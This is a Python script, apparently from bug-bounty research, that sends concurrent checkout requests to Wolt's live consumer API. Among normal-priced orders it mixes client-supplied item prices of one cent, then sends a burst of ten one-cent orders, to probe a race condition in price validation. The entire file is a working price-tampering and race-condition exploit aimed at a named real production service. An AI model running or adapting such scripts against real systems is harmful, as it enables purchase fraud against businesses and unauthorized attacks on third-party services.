"""Race condition: concurrent checkout with different prices."""
import requests, threading, time

H = {
    'User-Agent': 'Mozilla/5.0',
    'Origin': 'https://wolt.com',
    'X-HackerOne-Research': 'pccp',
    'Content-Type': 'application/json',
}
BASE = 'https://consumer-api.wolt.com/order-xp/web/v2/pages/checkout'
VENUE_ID = '60ebeb71c6904c2caf035f71'
FAKE_ITEM_ID = '670fa3e9ead6e49d65cc3614'

results = []

def checkout(price, label):
    item = {
        'id': FAKE_ITEM_ID, 'name': f'Race-{label}', 'count': 1,
        'price': price, 'base_price': price, 'end_amount': price,
        'options': [], 'restrictions': [], 'category_id': '',
        'exclude_from_discounts': False,
    }
    body = {
        'items': [item], 'base_price': price, 'end_amount': price,
        'supplier_id': VENUE_ID, 'selected_delivery_method': 'homedelivery',
        'delivery_location': {'lat': 60.168142, 'lon': 24.939986},
        'currency': 'EUR', 'vendor': 'wolt', 'discount': 0, 'surcharges': [],
        'basket_id': f'race-{label}', 'pickup': False, 'scheduled_time': None,
        'shipping_method': 'homedelivery', 'discount_code': None,
        'purchase_plan': {
            'venue': {'id': VENUE_ID, 'country': 'FIN', 'currency': 'EUR'},
            'delivery_method': 'homedelivery',
            'menu_items': [dict(item)]
        }
    }
    try:
        r = requests.post(BASE, headers=H, json=body, timeout=15)
        d = r.json() if r.status_code == 200 else {'error': r.text[:150]}
        d['_status'] = r.status_code
        results.append((label, price, d))
    except Exception as e:
        results.append((label, price, {'error': str(e)}))

print("=== RACE CONDITION: CHECKOUT PRICE ===")
print("Send 5 concurrent requests: 4 with normal price + 1 with price=1\n")

# Race 1: 4x normal + 1x 1-cent
results.clear()
threads = []
prices = [306, 306, 1, 306, 306]  # 1-cent hidden among normals
for i, p in enumerate(prices):
    t = threading.Thread(target=checkout, args=(p, f'r1-{i}'))
    threads.append(t)
for t in threads:
    t.start()
for t in threads:
    t.join()
print("Race 1 (4x306 + 1x1):")
for label, price, data in sorted(results, key=lambda x: x[1]):
    pa = data.get('payable_amount', '?')
    s = data.get('_status', '?')
    print(f"  {label}: price={price:>4} -> {s} | payable={pa}")
time.sleep(1)

# Race 2: 1x 1-cent + 4x 306
results.clear()
threads = []
prices2 = [1, 306, 306, 306, 306]
for i, p in enumerate(prices2):
    t = threading.Thread(target=checkout, args=(p, f'r2-{i}'))
    threads.append(t)
for t in threads:
    t.start()
for t in threads:
    t.join()
print("\nRace 2 (1x1 + 4x306):")
for label, price, data in sorted(results, key=lambda x: x[1]):
    pa = data.get('payable_amount', '?')
    s = data.get('_status', '?')
    print(f"  {label}: price={price:>4} -> {s} | payable={pa}")
time.sleep(1)

# Race 3: All 1-cent burst
results.clear()
threads = []
for i in range(10):
    t = threading.Thread(target=checkout, args=(1, f'r3-{i}'))
    threads.append(t)
for t in threads:
    t.start()
for t in threads:
    t.join()
print(f"\nRace 3 (10x 1-cent burst): {len(results)} responses")
for label, price, data in sorted(results, key=lambda x: x[0]):
    pa = data.get('payable_amount', '?')
    s = data.get('_status', '?')
    print(f"  {label}: price={price:>4} -> {s} | payable={pa}")

print("\n=== DONE ===")
